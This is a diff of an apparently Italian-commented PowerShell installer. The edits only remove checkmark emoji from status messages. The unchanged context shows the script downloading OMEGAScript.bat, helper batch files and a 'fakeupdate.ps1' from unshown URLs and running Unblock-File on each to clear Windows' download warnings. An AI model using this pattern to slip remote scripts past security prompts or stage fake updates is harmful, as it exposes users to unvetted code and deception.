@@ -12,7 +12,7 @@ $mainFile = "$folder\OMEGAScript.bat"
 
 Invoke-WebRequest -Uri $mainUrl -OutFile $mainFile
 Unblock-File $mainFile
-Write-Host "✅ OMEGAScript.bat" -ForegroundColor Green
+Write-Host " OMEGAScript.bat" -ForegroundColor Green
 
 # ===== SCARICA GLI HELPER (file batch) =====
 $helpers = @(
@@ -24,7 +24,7 @@ foreach ($h in $helpers) {
     $output = "$folder\$($h.Name)"
     Invoke-WebRequest -Uri $h.Url -OutFile $output
     Unblock-File $output
-    Write-Host "✅ $($h.Name)" -ForegroundColor Green
+    Write-Host " $($h.Name)" -ForegroundColor Green
 }
 
 # ===== SCARICA LO SCRIPT POWERSHELL (fake update) =====
@@ -33,7 +33,8 @@ $psFile = "$folder\fakeupdate.ps1"
 
 Invoke-WebRequest -Uri $psUrl -OutFile $psFile
 Unblock-File $psFile
-Write-Host "✅ fakeupdate.ps1" -ForegroundColor Green
+Write-Host " fakeupdate.ps1" -ForegroundColor Green
+
 
 # ===== SBLOCCO DI SICUREZZA AGGIUNTIVO =====
 # Sblocca TUTTI i file .bat e .ps1 nella cartella (doppia sicurezza)
